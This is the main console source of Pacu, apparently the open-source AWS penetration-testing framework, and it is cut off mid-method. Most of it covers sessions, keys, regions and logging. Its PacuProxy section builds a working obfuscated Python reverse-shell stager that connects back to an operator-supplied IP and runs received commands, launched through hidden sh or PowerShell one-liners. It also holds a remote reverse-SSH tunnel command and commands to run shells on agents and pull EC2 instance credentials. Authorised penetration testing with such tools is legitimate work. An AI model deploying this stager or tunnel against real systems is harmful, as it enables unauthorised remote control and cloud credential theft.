#!/usr/bin/env python3
import copy
import importlib
import json
import os
import platform
from queue import Queue
import random
import re
import string
import subprocess
import sys
import threading
import time
import traceback

try:
    import requests
    import boto3
    import botocore

    import configure_settings
    import settings

    from core.models import AWSKey, PacuSession, ProxySettings
    from proxy import PacuProxy
    from setup_database import setup_database_if_not_present
    from utils import get_database_connection, set_sigint_handler
except ModuleNotFoundError as error:
    exception_type, exception_value, tb = sys.exc_info()
    print('Traceback (most recent call last):\n{}{}: {}\n'.format(''.join(traceback.format_tb(tb)), str(exception_type), str(exception_value)))
    print('Pacu was not able to start because a required Python package was not found.\nRun `sh install.sh` to check and install Pacu\'s Python requirements.')
    sys.exit(1)


class Main:
    COMMANDS = [
        'data', 'exec', 'exit', 'help', 'list', 'ls', 'proxy', 'quit',
        'regions', 'run', 'search', 'services', 'set_keys', 'set_regions',
        'swap_keys', 'update_regions', 'whoami'
    ]

    def __init__(self):
        self.database = None
        self.server = None
        self.proxy = None
        self.queue = None
        self.running_module = None

    # Utility methods

    def log_error(self, text, exception_info=None, session=None, local_data=None, global_data=None):
        """ Write an error to the file at log_file_path, or a default log file
        if no path is supplied. If a session is supplied, its name will be used
        to determine which session directory to add the error file to. """

        timestamp = time.strftime('%F %T', time.gmtime())

        if session:
            session_tag = '({})'.format(session.name)
        else:
            session_tag = '<No Session>'

        try:
            if session:
                log_file_path = 'sessions/{}/error_log.txt'.format(session.name)
            else:
                log_file_path = 'global_error_log.txt'

            print('\n[{}] Pacu encountered an error while running the previous command. Check {} for technical details. [LOG LEVEL: {}]\n\n    {}\n'.format(timestamp, log_file_path, settings.ERROR_LOG_VERBOSITY.upper(), exception_info))

            log_file_directory = os.path.dirname(log_file_path)
            if log_file_directory and not os.path.exists(log_file_directory):
                os.makedirs(log_file_directory)

            formatted_text = '[{}] {}: {}'.format(timestamp, session_tag, text)

            if settings.ERROR_LOG_VERBOSITY.lower() in ('low', 'high', 'extreme'):
                if session:
                    session_data = session.get_all_fields_as_dict()
                    # Empty values are not valid keys, and that info should be
                    # preserved by checking for falsiness here.
                    if session_data.get('secret_access_key'):
                        session_data['secret_access_key'] = '****** (Censored)'

                    formatted_text += 'SESSION DATA:\n    {}\n'.format(
                        json.dumps(
                            session_data,
                            indent=4,
                            default=str
                        )
                    )

            if settings.ERROR_LOG_VERBOSITY.lower() == 'high':
                if local_data is not None and global_data is not None:
                    formatted_text += '\nLAST TWO FRAMES LOCALS DATA:\n    {}\n'.format('\n\n    '.join(local_data[:2]))
                    formatted_text += '\nLAST TWO FRAMES GLOBALS DATA:\n    {}\n'.format('\n\n    '.join(global_data[:2]))

            elif settings.ERROR_LOG_VERBOSITY.lower() == 'extreme':
                if local_data is not None and global_data is not None:
                    formatted_text += '\nALL LOCALS DATA:\n    {}\n'.format('\n\n    '.join(local_data))
                    formatted_text += '\nALL GLOBALS DATA:\n    {}\n'.format('\n\n    '.join(global_data))

            formatted_text += '\n'

            with open(log_file_path, 'a+') as log_file:
                log_file.write(formatted_text)

        except Exception as error:
            print('Error while saving exception information. This means the exception was not added to any error log and should most likely be provided to the developers.\n    Exception raised: {}'.format(str(error)))
            raise

    # @message: String - message to print and/or write to file
    # @output: String - where to output the message: both, file, or screen
    # @output_type: String - format for message when written to file: plain or xml
    # @is_cmd: boolean - Is the log the initial command that was run (True) or output (False)? Devs won't touch this most likely
    def print(self, message, output='both', output_type='plain', is_cmd=False, session_name=''):
        session = self.get_active_session()

        if session_name == '':
            session_name = session.name

        # Indent output from a command
        if is_cmd is False:
            # Add some recursion here to go through the entire dict for
            # 'SecretAccessKey'. This is to not print the full secret access
            # key into the logs, although this should get most cases currently.
            if isinstance(message, dict):
                if 'SecretAccessKey' in message:
                    message = copy.deepcopy(message)
                    message['SecretAccessKey'] = '{}{}'.format(message['SecretAccessKey'][0:int(len(message['SecretAccessKey']) / 2)], '*' * int(len(message['SecretAccessKey']) / 2))
                message = json.dumps(message, indent=2, default=str)
            elif isinstance(message, list):
                message = json.dumps(message, indent=2, default=str)

        # The next section prepends the module's name in square brackets in
        # front of the first line in the message containing non-whitespace
        # characters.
        if self.running_module and isinstance(message, str):
            split_message = message.split('\n')
            for index, fragment in enumerate(split_message):
                if re.sub(r'\s', '', fragment):
                    split_message[index] = '[{}] {}'.format(self.running_module, fragment)
                    break
            message = '\n'.join(split_message)

        if output == 'both' or output == 'file':
            if output_type == 'plain':
                with open('sessions/{}/cmd_log.txt'.format(session_name), 'a+') as text_file:
                    text_file.write('{}\n'.format(message))
            elif output_type == 'xml':
                # TODO: Implement actual XML output
                with open('sessions/{}/cmd_log.xml'.format(session_name), 'a+') as xml_file:
                    xml_file.write('{}\n'.format(message))
                pass
            else:
                print('  Unrecognized output type: {}'.format(output_type))

        if output == 'both' or output == 'screen':
            print(message)

        return True

    # @message: String - input question to ask and/or write to file
    # @output: String - where to output the message: both or screen (can't write a question to a file only)
    # @output_type: String - format for message when written to file: plain or xml
    def input(self, message, output='both', output_type='plain', session_name=''):
        session = self.get_active_session()

        if session_name == '':
            session_name = session.name

        if self.running_module and isinstance(message, str):
            split_message = message.split('\n')
            for index, fragment in enumerate(split_message):
                if re.sub(r'\s', '', fragment):
                    split_message[index] = '[{}] {}'.format(self.running_module, fragment)
                    break
            message = '\n'.join(split_message)

        res = input(message)
        if output == 'both':
            if output_type == 'plain':
                with open('sessions/{}/cmd_log.txt'.format(session_name), 'a+') as file:
                    file.write('{} {}\n'.format(message, res))
            elif output_type == 'xml':
                # TODO: Implement actual XML output
                # now = time.time()
                with open('sessions/{}/cmd_log.xml'.format(session_name), 'a+') as file:
                    file.write('{} {}\n'.format(message, res))\

            else:
                print('  Unrecognized output type: {}'.format(output_type))
        return res

    def validate_region(self, region):
        if region in self.get_regions('All'):
            return True
        return False

    def get_regions(self, service):
        session = self.get_active_session()

        service = str.lower(service)

        with open('./modules/service_regions.json', 'r+') as regions_file:
            regions = json.load(regions_file)

        # TODO: Add an option for GovCloud regions

        if str.lower(service) == 'all':
            return regions['all']
        if 'aws-global' in regions[service]['endpoints']:
            return [None]
        if 'all' in session.session_regions:
            return list(regions[service]['endpoints'].keys())
        else:
            valid_regions = list(regions[service]['endpoints'].keys())
            return [region for region in valid_regions if region in session.session_regions]

        if 'all' in session.session_regions:
            return regions
        else:
            return [region for region in valid_regions if region in session.session_regions]

    def display_all_regions(self, command):
        for region in sorted(self.get_regions('all')):
            print('  {}'.format(region))

    # @data: list
    # @module: string
    # @args: string
    def fetch_data(self, data, module, args, force=False):
        session = self.get_active_session()

        if data is None:
            current = None
        else:
            current = getattr(session, data[0], None)
            for item in data[1:]:
                if current is not None and item in current:
                    current = current[item]
                else:
                    current = None
                    break

        if current is None or current == '' or current == [] or current == {} or current is False:
            if force is False:
                run_prereq = self.input('The required data ({}) has not been found in this session, do you want to run the module "{}" to fetch that data? If not, re-run this module with the correct argument(s) specifying the values for this data. (y/n) '.format(' > '.join(data), module), session_name=session.name)
            else:
                run_prereq = 'y'
            if run_prereq == 'n':
                return False

            if args:
                self.exec_module(['exec', module] + args.split(' '))
            else:
                self.exec_module(['exec', module])
        return True

    def key_info(self, alias=''):
        """ Return the set of information stored in the session's active key
        or the session's key with a specified alias, as a dictionary. """
        session = self.get_active_session()

        if alias == '':
            alias = session.key_alias

        aws_key = self.get_aws_key_by_alias(alias)

        if aws_key is not None:
            return aws_key.get_fields_as_camel_case_dictionary()
        else:
            return False

    def print_key_info(self):
        print(json.dumps(self.key_info(), indent=2, default=str))

    def print_all_service_data(self, command):
        session = self.get_active_session()
        services = session.get_all_aws_data_fields_as_dict()
        for service in services.keys():
            print('  {}'.format(service))

    def install_dependencies(self, external_dependencies):
        if len(external_dependencies) < 1:
            return True
        answer = self.input('This module requires the external dependencies listed here: {}\n\nWould you like to install them now? (y/n) '.format(external_dependencies))
        if answer == 'n':
            self.print('Not installing dependencies, exiting...')
            return False
        self.print('\nInstalling {} total dependencies...'.format(len(external_dependencies)))
        for dependency in external_dependencies:
            split = dependency.split('/')
            name = split[-1]
            if name.split('.')[-1] == 'git':
                name = name.split('.')[0]
                author = split[-2]
                if os.path.exists('./dependencies/{}/{}'.format(author, name)):
                    self.print('  Dependency {}/{} is already installed.'.format(author, name))
                else:
                    try:
                        self.print('  Installing dependency {}/{} from {}...'.format(author, name, dependency))
                        subprocess.run(['git', 'clone', dependency, './dependencies/{}/{}'.format(author, name)])
                    except Exception as error:
                        self.print('    {} has failed, view the error below. If you are unsure, some potential causes are that you are missing "git" on your command line, your git credentials are not properly set or the GitHub link does not exist.'.format(error.cmd))
                        self.print('    Output from the command: {}\nstderr from the command: {}'.format(error.cmd, error.stderr))
                        self.print('  Exiting module...')
                        return False
            else:
                if os.path.exists('./dependencies/{}'.format(name)):
                    self.print('  Dependency {} is already installed.'.format(name))
                else:
                    try:
                        self.print('  Installing dependency {}...'.format(name))
                        r = requests.get(dependency, stream=True)
                        if r.status_code == 404:
                            raise Exception('File not found.')
                        with open('./dependencies/{}'.format(name), 'wb') as f:
                            for chunk in r.iter_content(chunk_size=1024):
                                if chunk:
                                    f.write(chunk)
                    except Exception as error:
                        self.print('    Downloading {} has failed, view the error below.'.format(dependency))
                        self.print(error)
                        self.print('  Exiting module...')

                        return False
        self.print('Dependencies have finished installing.')
        return True

    def get_active_session(self):
        """ A wrapper for PacuSession.get_active_session, removing the need to
        import the PacuSession model. """
        return PacuSession.get_active_session(self.database)

    def get_proxy_settings(self):
        """ A wrapper for ProxySettings.get_proxy_settings, removing the need
        to import the ProxySettings model. """
        return ProxySettings.get_proxy_settings(self.database)

    def get_aws_key_by_alias(self, alias):
        """ Return an AWSKey with the supplied alias that is assigned to the
        currently active PacuSession from the database, or None if no AWSKey
        with the supplied alias exists. If more than one key with the alias
        exists for the active session, an exception will be raised. """
        session = self.get_active_session()
        key = self.database.query(AWSKey)                           \
                           .filter(AWSKey.session_id == session.id) \
                           .filter(AWSKey.key_alias == alias)       \
                           .scalar()
        return key

    def start_proxy(self):
        proxy_settings = self.get_proxy_settings()
        self.create_workers(proxy_settings.ip, proxy_settings.port)
        self.create_jobs()
        return

    # Create the proxy threads
    def create_workers(self, proxy_ip, proxy_port):
        self.server = PacuProxy()
        self.server.prepare_server(self.database)
        for _ in range(2):
            t = threading.Thread(target=self.work, args=(), daemon=True)
            t.daemon = True
            t.start()
        return

    # Handle the next job in queue (one thread handles connections, other sends commands)
    def work(self):
        while True:
            x = self.queue.get()
            if x == 1:
                self.server.socket_create()
                self.server.socket_bind()
                self.server.accept_connections()
            if x == 5:
                break  # Shutdown listener called
        self.queue.task_done()
        return

    # Fill the queue with jobs
    def create_jobs(self):
        for x in [1, 2]:  # Job numbers
            self.queue.put(x)
        return

    # Return a PacuProxy stager string
    def get_proxy_stager(self, ip, port, os):
        python_stager = "import os,platform as I,socket as E,subprocess as B,time as t,sys as X,struct as D\\nV=True\\nY=t.sleep\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      Y(5)\\n      raise\\n    try:\\n      self.s.send('{{}}\\{{}}'.format(I.system(),E.gethostname()).encode())\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode()\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while V:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='e:%s'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        X.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=V,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='e:%s'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while V:\\n    try:\\n      C.c()\\n    except:\\n      Y(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except SystemExit:\\n    X.exit(0)\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nX.stderr=object\\nwhile V:\\n  f()".format(ip, port)
        if os == 'sh':  # Linux one-liner (uses \" to escape inline double-quotes)
            return 'python -c "{}" &'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager))
        elif os == 'ps':  # Windows one-liner (uses `" to escape inline double-quotes)
            return 'Start-Process -FilePath "python" -Verb open -WindowStyle Hidden -ArgumentList "-c {}"'.format('exec(`\"`\"`\"{}`\"`\"`\")'.format(python_stager))
        else:
            return 'Incorrect input, expected target operating system ("sh" or "ps"), received: {}'.format(os)

    def get_ssh_user(self, ssh_username):
        user_id = ''
        if ssh_username is None or ssh_username == '':
            new_user = self.input('No SSH user found to create the reverse connection back from the target agent. An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')

            if new_user == 'y':
                # Create a random username that is randomly 3-9 characters
                username = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
                command = 'useradd -l -m -s /bin/false {}'.format(username)
                self.print('Running command: {}\n'.format(command))

                try:
                    subprocess.run(command.split(' '))
                    try:
                        user_id = subprocess.check_output('id -u {}'.format(username), shell=True).decode('utf-8')
                        if 'no such user' in user_id:
                            self.print('[0] Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
                            return None
                        self.print('User {} created successfully!\n'.format(username))
                        return username
                    except Exception as error:
                        self.print('[1] Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
                        return None

                except Exception as error:
                    self.print('[2] Failed to create user...')
                    return None

            else:
                return None

        else:
            try:
                user_id = subprocess.check_output('id -u {}'.format(ssh_username), shell=True).decode('utf-8')
                if 'no such user' in user_id:
                    self.print('[3] Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
                    new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
                    if new_user == 'y':
                        return self.get_ssh_user(None)
                    else:
                        return None
                else:
                    return ssh_username
            except Exception as error:
                self.print('[4] Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
                new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
                if new_user == 'y':
                    return self.get_ssh_user(None)
                else:
                    return None

    def get_ssh_key(self, ssh_username, ssh_priv_key):
        if ssh_priv_key is None or ssh_priv_key == '':
            new_key = self.input('No SSH key found for user {}. Do you want to generate one? (y/n) '.format(ssh_username))

            if new_key == 'y':
                self.print('Setting up SSH access for user {}...\n'.format(ssh_username))
                ssh_dir = '/home/{}/.ssh'.format(ssh_username)
                command = 'ssh-keygen -t rsa -f {}/id_rsa'.format(ssh_dir)

                try:
                    self.print('Creating .ssh dir for user {ssh_username} and passing ownership...')
                    if not os.path.isdir(ssh_dir):
                        os.makedirs(ssh_dir)
                    subprocess.run('chown -R {}:{} {}'.format(ssh_username, ssh_username, ssh_dir).split(' '))
                    subprocess.run('chmod 700 {}'.format(ssh_dir).split(' '))
                    self.print('Generating public and private SSH key...')
                    subprocess.run(command.split(' '))
                    self.print('Creating authorized_keys file...')
                    subprocess.run('cp {}/id_rsa.pub {}/authorized_keys'.format(ssh_dir, ssh_dir).split(' '))

                    self.print('Ensuring that local port forwarding is disabled (to prevent a "hack back" scenario)...')
                    action = ''
                    with open('/etc/ssh/sshd_config', 'r') as config_file:
                        contents = config_file.read()
                        if 'AllowTcpForwarding' in contents:
                            if 'AllowTcpForwarding remote' in contents:
                                self.print('Already disabled.')
                            else:
                                action = 'replace'
                        else:
                            action = 'add'

                    with open('/etc/ssh/sshd_config', 'w') as config_file:
                        if action == 'replace':
                            contents = re.sub(r'.*AllowTcpForwarding.*', 'AllowTcpForwarding remote', contents)
                            config_file.write(contents)
                        elif action == 'add':
                            contents += '\nAllowTcpForwarding remote'
                            config_file.write(contents)
                        else:
                            config_file.write(contents)
                    with open('{}/id_rsa'.format(ssh_dir), 'r') as config_file:
                        ssh_priv_key = config_file.read()

                    return ssh_priv_key

                except Exception as error:
                    self.print('[5] Could not setup SSH access for user {}...'.format(ssh_priv_key))
                    return None

            else:
                return None

        else:
            return ssh_priv_key

    # Pacu commands and execution

    def parse_command(self, command):
        command = command.strip()
        command = command.split(' ')

        if command[0] == '':
            return
        elif command[0] == 'data':
            self.parse_data_command(command)
        elif command[0] == 'help':
            self.parse_help_command(command)
        elif command[0] == 'list' or command[0] == 'ls':
            self.parse_list_command(command)
        elif command[0] == 'proxy':
            self.parse_proxy_command(command)
        elif command[0] == 'regions':
            self.display_all_regions(command)
        elif command[0] == 'run' or command[0] == 'exec':
            self.parse_exec_module_command(command)
        elif command[0] == 'search':
            self.parse_search_command(command)
        elif command[0] == 'services':
            self.print_all_service_data(command)
        elif command[0] == 'set_keys':
            self.set_keys()
        elif command[0] == 'set_regions':
            self.parse_set_regions_command(command)
        elif command[0] == 'swap_keys':
            self.swap_keys()
        elif command[0] == 'update_regions':
            self.update_regions()
        elif command[0] == 'whoami':
            self.print_key_info()
        elif command[0] == 'exit' or command[0] == 'quit':
            self.exit()
        else:
            print('  Error: Unrecognized command')
        return

    def parse_data_command(self, command):
        session = self.get_active_session()
        proxy_settings = self.get_proxy_settings()

        if len(command) == 1:
            self.print('\nSession data:')
            session.print_all_data_in_session()
            self.print('\nProxy data:')
            proxy = {
                'IP': proxy_settings.ip,
                'Port': proxy_settings.port,
                'Listening': proxy_settings.listening,
                'SSHUsername': proxy_settings.ssh_username,
                'SSHPrivateKey': proxy_settings.ssh_priv_key,
                'TargetAgent': copy.deepcopy(proxy_settings.target_agent)
            }
            self.print(proxy)

        else:
            if command[1] == 'proxy':
                proxy = {
                    'IP': proxy_settings.ip,
                    'Port': proxy_settings.port,
                    'Listening': proxy_settings.listening,
                    'SSHUsername': proxy_settings.ssh_username,
                    'SSHPrivateKey': proxy_settings.ssh_priv_key,
                    'TargetAgent': copy.deepcopy(proxy_settings.target_agent)
                }
                self.print(proxy)
            elif command[1] not in session.aws_data_field_names:
                print('  Service not found.')
            elif getattr(session, command[1]) == {} or getattr(session, command[1]) == [] or getattr(session, command[1]) == '':
                print('  No data has been collected yet for the specified service.')
            else:
                print(json.dumps(getattr(session, command[1]), indent=2, sort_keys=True, default=str))

    def parse_set_regions_command(self, command):
        session = self.get_active_session()

        if len(command) > 1:
            for region in command[1:]:
                if region.lower() == 'all':
                    session.update(self.database, session_regions=['all'])
                    print('  The region set for this session has been reset to the default of all supported regions.')
                    return
                if self.validate_region(region) is False:
                    print('  {} is not a valid region.\n  Session regions not changed.'.format(region))
                    return
            session.update(self.database, session_regions=command[1:])
            print('  The region set for this session has been changed: {}'.format(session.session_regions))
        else:
            print('  The set_regions command requires either the argument "all", or at least one region, to be specified. Try using the "regions" command to view available regions.')

    def parse_help_command(self, command):
        if len(command) <= 1:
            self.display_pacu_help()
        elif len(command) > 1 and command[1] in self.COMMANDS:
            self.display_command_help(command[1])
        else:
            self.display_module_help(command[1])

    def parse_list_command(self, command):
        if len(command) == 1:
            self.list_modules('')
        elif len(command) == 2:
            if command[1] in ('cat', 'category'):
                self.list_modules('', by_category=True)

    def parse_proxy_command(self, command):
        proxy_settings = self.get_proxy_settings()

        proxy_ip = proxy_settings.ip
        proxy_port = proxy_settings.port
        proxy_listening = proxy_settings.listening
        proxy_ssh_username = proxy_settings.ssh_username
        proxy_ssh_priv_key = proxy_settings.ssh_priv_key
        proxy_target_agent = copy.deepcopy(proxy_settings.target_agent)

        if len(command) == 1 or (len(command) == 2 and command[1] == 'help'):  # Display proxy help
            self.display_proxy_help()
        elif command[1] == 'start':  # Start proxy server
            if len(command) < 3:
                self.print('You need to pass at least an IP address to proxy start: proxy start <ip> [<port>]')
                return
            if proxy_listening is False:
                if len(command) == 4:
                    proxy_port = command[3]
                else:
                    proxy_port = 80
                proxy_ip = command[2]
                if proxy_ip == '0.0.0.0':
                    self.print('Proxy IP must be the public IP of the server to stage agents correctly and not 0.0.0.0. PacuProxy will fallback to listening on 0.0.0.0 if it fails to start a listener on the supplied IP address, but the public IP is required to send to agents so they can contact the server.')
                    return
                print('Starting PacuProxy on {}:{}...'.format(proxy_ip, proxy_port))
                proxy_settings.update(self.database, ip=proxy_ip, port=proxy_port)
                self.start_proxy()
                proxy_listening = True
                proxy_settings.update(self.database, listening=proxy_listening)
                return
            else:
                print('There already seems to be a listener running: {}'.format(self.server))
        elif command[1] == 'list' or command[1] == 'ls':  # List active agent connections
            self.server.list_connections()
        elif command[1] == 'shell':  # Run shell command on an agent
            if len(command) > 3:
                self.server.run_cmd(int(command[2]), self.server.all_connections[int(command[2])], ' '.join(command[3:]))
            else:
                print('** Incorrect input, expected an agent ID and a shell command. Use the format: proxy shell <agent_id> <shell command> **')
        elif command[1] == 'fetch_ec2_keys':
            if len(command) == 3:
                self.fetch_ec2_keys(int(command[2]), self.server.all_connections[int(command[2])])
            else:
                self.print('** Incorrect input, expect an agent ID. Use the format: proxy fetch_ec2_keys <agent_id> **')
        elif command[1] == 'stop':  # Stop proxy server
            if proxy_listening is False:
                print('There does not seem to be a listener running currently.')
            else:
                self.server.quit_gracefully()
                self.queue.put(5)
                self.server = None
                proxy_listening = False
                proxy_target_agent = []
        elif command[1] == 'kill':  # Kill an agent connection
            if len(command) == 3:
                self.print('** Killing agent {}... **'.format(int(command[2])))
                self.server.quit(int(command[2]), self.server.all_connections[int(command[2])])
                self.print('** Agent killed **')
            elif len(command) == 2:
                print('** Incorrect input, excepted an agent ID, received nothing. Use format: proxy kill <agent_id> **')
            else:
                print('** Incorrect input, excepted an agent ID, received: {}'.format(command[2:]))
        elif command[1] == 'stager':
            if len(command) == 3:
                self.print(self.get_proxy_stager(proxy_ip, proxy_port, command[2]))
            else:
                self.print('** Incorrect input, expected target operating system ("sh" or "ps"), received: {}'.format(command[2:]))
        elif command[1] == 'use':
            if len(command) == 3:
                try:
                    if command[2] == 'none':
                        self.print('** No longer using a remote PacuProxy agent to route commands. **')
                        proxy_target_agent = []
                    else:
                        if platform.system() == 'Windows':
                            self.print('** Windows hosts do not currently support module proxying. Run the PacuProxy server on a Linux host for full module proxying capability. **')
                            return
                        try:
                            test = int(command[2])
                        except:
                            self.print('** Invalid agent ID, expected an integer or "none", received: {} **'.format(command[2]))
                            return
                        proxy_target_agent = self.server.all_addresses[int(command[2])]

                        if proxy_target_agent[-1].startswith('Windows'):
                            self.print('** Invalid agent target. Windows hosts are not supported as a proxy agent (coming soon), but they can still be staged and you can still run shell commands on them. **')
                            return

                        print('Setting proxy target to agent {}...'.format(command[2]))

                        old_username = proxy_ssh_username

                        # Find or create an SSH user
                        proxy_ssh_username = self.get_ssh_user(proxy_ssh_username)
                        if proxy_ssh_username is None:
                            self.print('No SSH user on the local PacuProxy server, not routing traffic through the target agent.')
                            return

                        # In case there previously was a user and for some reason a new one needed to be created,
                        # ensure that a new key gets created for them
                        if not old_username == proxy_ssh_username:
                            proxy_ssh_priv_key = None

                        restart = False
                        if proxy_ssh_priv_key is None or proxy_ssh_priv_key == '':
                            restart = True

                        # Find or generate an SSH key for that user
                        proxy_ssh_priv_key = self.get_ssh_key(proxy_ssh_username, proxy_ssh_priv_key)
                        if proxy_ssh_priv_key is None:
                            self.print('No SSH key for user {}, not routing traffic through the target agent.'.format(proxy_ssh_username))
                            proxy_settings.update(self.database, ssh_username=proxy_ssh_username)
                            return

                        # If an SSH key was just generated, make sure local port forwarding is disabled
                        if restart is True:
                            self.print('SSH user setup successfully. It is highly recommended to restart your sshd service before continuing. Part of the SSH user creation process was to restrict access to local port forwarding, but this change requires an sshd restart. If local port forwarding is not disabled, your target machine can "hack back" by forwarding your local ports to their machine and accessing the services hosted on them. This can be done by running "service sshd restart".\n')
                            proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_priv_key=proxy_ssh_priv_key)
                            restart_sshd = self.input('  Do you want Pacu to restart sshd (Warning: If you are currently connected to your server over SSH, you may lose your connection)? Press enter if so, enter "ignore" to ignore this warning, or press Ctrl+C to exit and restart it yourself (Enter/ignore/Ctrl+C): ')

                            if restart_sshd == 'ignore':
                                pass
                            elif restart_sshd == '':
                                self.print('Restarting sshd...')
                                subprocess.run('service sshd restart', shell=True)

                        self.print('Telling remote agent to connect back...')
                        shm_name = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
                        connect_back_cmd = 'echo "{}" > /dev/shm/{} && chmod 600 /dev/shm/{} && ssh -i /dev/shm/{} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8001 {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_priv_key, shm_name, shm_name, shm_name, proxy_ssh_username, proxy_ip)
                        self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], connect_back_cmd)
                        self.print('Remote agent connected!')
                except Exception as error:
                    self.print('** Invalid agent ID, expected an integer or "none": {} **'.format(error))
            else:
                self.print('** Incorrect input, excepted an agent ID, received: {}'.format(command[2:]))
        else:
            self.print('** Unrecognized proxy command: {} **'.format(command[1]))
        proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_priv_key=proxy_ssh_priv_key, listening=proxy_listening, target_agent=proxy_target_agent)
        return

    def parse_exec_module_command(self, command):
        if len(command) > 1:
            self.exec_module(command)
        else:
            print('The {} command requires a module name. Try using the module search function.'.format(command))

    def parse_search_command(self, command):
        if len(command) == 1:
            self.list_modules('')
        elif len(command) == 2:
            self.list_modules(command[1])
        elif len(command) >= 3:
            if command[1] in ('cat', 'category'):
                self.list_modules(command[2], by_category=True)

    def display_pacu_help(self):
        print("""
        Pacu - https://github.com/RhinoSecurityLabs/pacu
        Written and researched by Spencer Gietzen of Rhino Security Labs - https://rhinosecuritylabs.com/

        This was built as a modular, open source tool to assist in penetration testing an AWS environment.
        For usage and developer documentation, please visit the GitHub page.

        Modules that have pre-requisites will have those listed in that modules help info, but if it is
        executed before its pre-reqs have been filled, it will prompt you to run that module then continue
        once that is finished, so you have the necessary data for the module you want to run.

        Command info:
            proxy [help]                        Control PacuProxy/display help
                start <ip> [port]                 Start the PacuProxy listener - port 80 by default.
                                                    The listener will attempt to start on the IP
                                                    supplied, but some hosts don't allow this. In
                                                    this case, PacuProxy will listen on 0.0.0.0 and
                                                    use the supplied IP to stage agents and it should
                                                    work the same
                stop                              Stop the PacuProxy listener
                kill <agent_id>                   Kill an agent (stop it from running on the host)
                list/ls                           List info on remote agent(s)
                use none|<agent_id>               Use a remote agent, identified by unique integers
                                                    (use "proxy list" to see them). Choose "none" to
                                                    no longer use any proxy (route from the local
                                                    host instead)
                shell <agent_id> <command>        Run a shell command on the remote agent
                fetch_ec2_keys <agent_id>         Try to read the meta-data of the target agent to
                                                    request a set of temporary credentials for the
                                                    attached instance profile (if there is one),
                                                    then save them to the Pacu database and set
                                                    them as the active key pair
                stager sh|ps                      Generate a PacuProxy stager. The "sh" format is
                                                    for *sh shells in Unix (like bash), and the "ps"
                                                    format is for PowerShell on Windows
            list/ls                             List all modules
            search [cat[egory]] <search term>   Search the list of available modules by name or category
            help                                Display this page of information
            help <module name>                  Display information about a module
            whoami                              Display information regarding to the active access keys
            data                                Display all data that is stored in this session. Only fields
                                                  with values will be displayed
            data <service>|proxy                Display all data for a specified service or for PacuProxy
                                                  in this session
            services                            Display a list of services that have collected data in the
                                                  current session to use with the "data" command
            regions                             Display a list of all valid AWS regions
            update_regions                      Run a script to update the regions database to the newest
                                                  version
            set_regions <region> [<region>...]  Set the default regions for this session. These space-separated
                                                  regions will be used for modules where regions are required,
                                                  but not supplied by the user. The default set of regions is
                                                  every supported region for the service. Supply "all" to this
                                                  command to reset the region set to the default of all
                                                  supported regions
            run/exec <module name>              Execute a module
            set_keys                            Add a set of AWS keys to the session and set them as the
                                                  default
            swap_keys                           Change the currently active AWS key to another key that has
                                                  previously been set for this session
            exit/quit                           Exit Pacu
        """)

    def display_proxy_help(self):
        print("""
    PacuProxy command info:
        proxy [help]                        Control PacuProxy/display help
            start <ip> [port]                 Start the PacuProxy listener - port 80 by default.
                                                The listener will attempt to start on the IP
                                                supplied, but some hosts don't allow this. In
                                                this case, PacuProxy will listen on 0.0.0.0 and
                                                use the supplied IP to stage agents and it should
                                                work the same
            stop                              Stop the PacuProxy listener
            kill <agent_id>                   Kill an agent (stop it from running on the host)
            list/ls                           List info on remote agent(s)
            use none|<agent_id>               Use a remote agent, identified by unique integers
                                                (use "proxy list" to see them). Choose "none" to
                                                no longer use any proxy (route from the local
                                                host instead)
            shell <agent_id> <command>        Run a shell command on the remote agent
            fetch_ec2_keys <agent_id>         Try to read the meta-data of the target agent to
                                                request a set of temporary credentials for the
                                                attached instance profile (if there is one),
                                                then save them to the Pacu database and set
                                                them as the active key pair
            stager sh|ps                      Generate a PacuProxy stager. The "sh" format is
                                                for *sh shells in Unix (like bash), and the "ps"
                                                format is for PowerShell on Windows
""")

    def update_regions(self):
